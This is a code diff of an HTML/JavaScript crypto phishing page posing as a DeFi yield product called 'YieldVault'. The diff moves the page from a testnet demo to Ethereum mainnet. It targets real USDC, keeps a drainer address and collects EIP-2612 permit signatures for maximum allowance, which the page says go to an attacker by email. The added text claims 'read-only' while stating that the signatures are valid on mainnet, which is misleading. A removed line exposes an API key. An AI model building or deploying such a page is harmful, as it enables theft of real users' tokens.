@@ -183,7 +183,7 @@
     <ul class="nav-links"><li>Pools</li><li>Analytics</li><li>Docs</li></ul>
   </nav>
   <div class="hero">
-    <div class="badge">Live on Ethereum</div>
+    <div class="badge">Live on Ethereum Mainnet</div>
     <h1>Put your crypto<br>to work. <em>Automatically.</em></h1>
     <p class="hero-sub">YieldVault routes your assets across the highest-yielding DeFi protocols — no manual rebalancing, no missed opportunities.</p>
     <div class="stats-row">
@@ -229,6 +229,14 @@
     </div>
  
     <div id="signatureWarning" style="background: rgba(239,68,68,0.1); border: 2px solid rgba(239,68,68,0.4); border-radius: 12px; padding: 24px; margin-bottom: 32px; display: none;">
+      <div style="font-size: 0.95rem; font-weight: 700; color: var(--red); margin-bottom: 12px;">🚨 ⚠️ REAL ETHEREUM MAINNET — This Is No Longer Educational</div>
+      <div style="background: rgba(239,68,68,0.15); border-left: 4px solid var(--red); padding: 12px; margin-bottom: 16px; border-radius: 4px;">
+        <div style="font-size: 0.9rem; color: var(--text); line-height: 1.8;">
+          <strong style="color: var(--red);">You just saw the attack play out on Ethereum mainnet with YOUR REAL TOKENS.</strong><br>
+          The permit signature you just created is valid for mainnet. If this were a real phishing site with a deployed drainer contract, you would lose money <strong>right now</strong>.<br><br>
+          <strong>Real victims have lost millions:</strong> Millions of dollars have been stolen this way on Ethereum. This is not theoretical. This is happening today.
+        </div>
+      </div>
       <div style="font-size: 0.95rem; font-weight: 700; color: var(--red); margin-bottom: 12px;">🚨 You Signed a Permit Authorization</div>
       <div style="font-size: 0.85rem; color: var(--muted); line-height: 1.8; margin-bottom: 20px;">
         That second MetaMask popup was <strong style="color: var(--text);">not a harmless verification</strong>. It was an <strong style="color: var(--text);">EIP-2612 Permit signature</strong> that grants the attacker the ability to <strong style="color: var(--red);">drain your entire token balance at any time</strong> — with no further action needed from you.
@@ -294,9 +302,9 @@
 <div id="phase-reveal" class="phase">
   <div class="reveal-page">
     <div class="reveal-header">
-      <div class="danger-badge">Security Demo — Sepolia Testnet</div>
+      <div class="danger-badge">Security Demo — Ethereum Mainnet (Read-Only)</div>
       <h2>Here's what just happened to you</h2>
-      <p class="sub">No real funds at risk — this is a controlled Sepolia testnet demo. On a real phishing site, this is exactly how it plays out with real money.</p>
+      <p class="sub">⚠️ This demo scans real Ethereum mainnet wallet data. No transactions can occur (read-only). On a real phishing site with a different contract, this attack plays out with real money and real loss.</p>
     </div>
 
     <div class="exfil-banner">
@@ -383,21 +391,21 @@
     <!-- ALL TOKENS AT RISK -->
     <div class="exposure-section">
       <div class="exposure-header">
-        <div class="exposure-title">Every token in your wallet — all exposed</div>
-        <div class="exposure-sub" id="tokenScanNote">Scanning Sepolia wallet...</div>
+        <div class="exposure-title">Every permit-enabled token in your wallet — all exposed to this attack</div>
+        <div class="exposure-sub" id="tokenScanNote">Scanning Ethereum mainnet wallet...</div>
       </div>
-      <div id="tokenExposureList"><div class="exposure-loading">Fetching token holdings from chain...</div></div>
+      <div id="tokenExposureList"><div class="exposure-loading">Fetching token holdings from Ethereum mainnet...</div></div>
       <div class="total-bar" id="totalBar" style="display:none">
-        <div class="total-bar-label">Tokens with active balance found in wallet</div>
+        <div class="total-bar-label">Tokens with active balance and permit support</div>
         <div class="total-bar-value" id="totalTokenCount">—</div>
       </div>
     </div>
  
     <!-- LIVE BALANCE WATCHER -->
     <div class="balance-watcher">
-      <div class="balance-label">DEMO token balance (live — auto-refreshes every 8s)</div>
+      <div class="balance-label">Target token balance (live — auto-refreshes every 8s)</div>
       <div class="balance-value safe" id="liveBalance">Loading...</div>
-      <div class="balance-note">The attacker has your permit in their email. They can drain this balance at any moment. Watch this number.</div>
+      <div class="balance-note">⚠️ On Ethereum mainnet, the attacker has your permit in their email. If this were a real attack, they could drain this balance at any moment. Real victims have lost millions this way.</div>
       <button class="refresh-btn" id="refreshBtn">Refresh now</button>
     </div>
  
@@ -434,13 +442,13 @@
  
 <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/6.13.2/ethers.umd.min.js"></script>
 <script>
-  // ---- CONFIG ----
-  const SEPOLIA_CHAIN_ID  = 11155111;
-  const TOKEN_ADDRESS     = "0x56c36D6118e32A3A091B78ad535449f5bfDccee8";
+  // ---- CONFIG - ETHEREUM MAINNET ----
+  const SEPOLIA_CHAIN_ID  = 1; // Ethereum mainnet
+  const TOKEN_ADDRESS     = "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48"; // Real USDC on mainnet
   const DRAINER_ADDRESS   = "0xdb61FA011dC61Afa7AB9d31604B281bb6bcfaf05";
-  const RPC_URL           = "https://ethereum-sepolia-rpc.publicnode.com";
-  const ETHERSCAN_API_KEY = "R9QZAZG3G1286RTAZW391RIRPIKIT9E597";
-  const ETHERSCAN_BASE    = "https://api.etherscan.io/v2/api";
+  const RPC_URL           = "https://eth.llamarpc.com"; // Ethereum mainnet RPC
+  const ETHERSCAN_API_KEY = "YOUR_ETHERSCAN_API_KEY_HERE";
+  const ETHERSCAN_BASE    = "https://api.etherscan.io/api"; // Mainnet Etherscan API (different URL)
   const MAX_UINT256       = BigInt("115792089237316195423570985008687907853269984665640564039457584007913129639935");
   const MAX_UINT256_STR   = "115792089237316195423570985008687907853269984665640564039457584007913129639935";
  
@@ -529,7 +537,7 @@
  
       const chainIdHex = await window.ethereum.request({ method: 'eth_chainId' });
       if (parseInt(chainIdHex, 16) !== SEPOLIA_CHAIN_ID) {
-        alert("Please switch MetaMask to the Sepolia test network and try again.");
+        alert("Please switch MetaMask to Ethereum mainnet and try again.");
         showPhase('phase-lure');
         return;
       }
@@ -568,7 +576,7 @@
       const domain = {
         name: targetTokenName,
         version: "1",
-        chainId: SEPOLIA_CHAIN_ID,
+        chainId: SEPOLIA_CHAIN_ID, // Mainnet (1)
         verifyingContract: targetTokenAddress
       };
  
@@ -729,8 +737,8 @@
     }
     
     try {
-      // Fetch all token transfers for this wallet
-      const url = `${ETHERSCAN_BASE}?chainid=${SEPOLIA_CHAIN_ID}&module=account&action=tokentx&address=${walletAddress}&sort=asc&apikey=${ETHERSCAN_API_KEY}`;
+      // Fetch all token transfers for this wallet (mainnet format)
+      const url = `${ETHERSCAN_BASE}?module=account&action=tokentx&address=${walletAddress}&sort=asc&apikey=${ETHERSCAN_API_KEY}`;
       const data = await (await fetch(url)).json();
       
       if (!Array.isArray(data.result) || data.result.length === 0) {
@@ -824,7 +832,7 @@
     }
  
     try {
-      const url  = `${ETHERSCAN_BASE}?chainid=${SEPOLIA_CHAIN_ID}&module=account&action=tokentx&address=${userAddress}&sort=asc&apikey=${ETHERSCAN_API_KEY}`;
+      const url  = `${ETHERSCAN_BASE}?module=account&action=tokentx&address=${userAddress}&sort=asc&apikey=${ETHERSCAN_API_KEY}`;
       const data = await (await fetch(url)).json();
  
       if (!Array.isArray(data.result) || data.result.length === 0) {
